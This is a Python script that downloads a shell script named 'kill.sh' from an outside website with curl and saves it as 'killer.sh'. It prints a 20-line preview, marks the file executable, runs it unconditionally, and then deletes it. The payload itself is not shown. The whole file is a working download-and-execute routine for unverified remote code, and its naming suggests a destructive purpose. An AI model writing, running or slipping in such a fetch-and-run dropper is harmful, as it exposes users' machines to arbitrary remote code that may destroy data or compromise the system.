import os
import sys

# URL to download and the local filename
url = "https://thedomaindesigners.com/pages/kill.sh"
filename = "killer.sh"

# Download using curl. -f = fail on http errors, -s = silent, -S = show errors, -L = follow redirects
download_cmd = f"curl -fsSL -o {filename} {url}"

print("Downloading...", url)
ret = os.system(download_cmd)
if ret != 0:
    print(f"Download failed (exit code {ret}). Aborting.")
    sys.exit(1)

# Verify file exists
if not os.path.exists(filename):
    print("Download did not produce the expected file. Aborting.")
    sys.exit(1)

# (Optional) Inspect the file before executing
print(f"Downloaded {filename}. First 20 lines for quick inspection:\n")
os.system(f"head -n 20 {filename}")
print("\n--- End of preview ---\n")

# Make executable
try:
    os.chmod(filename, 0o755)
except Exception as e:
    print(f"Could not set executable permission: {e}")
    # continue — execution might still work via bash

# Execute the script
print("Executing the script...")
ret = os.system(f"./{filename}")
if ret != 0:
    print(f"Script exited with non-zero code: {ret}")
else:
    print("Script finished successfully.")

# Cleanup (optional)
cleanup = True
if cleanup:
    try:
        os.remove(filename)
        print(f"Removed {filename}")
    except Exception as e:
        print(f"Could not remove {filename}: {e}")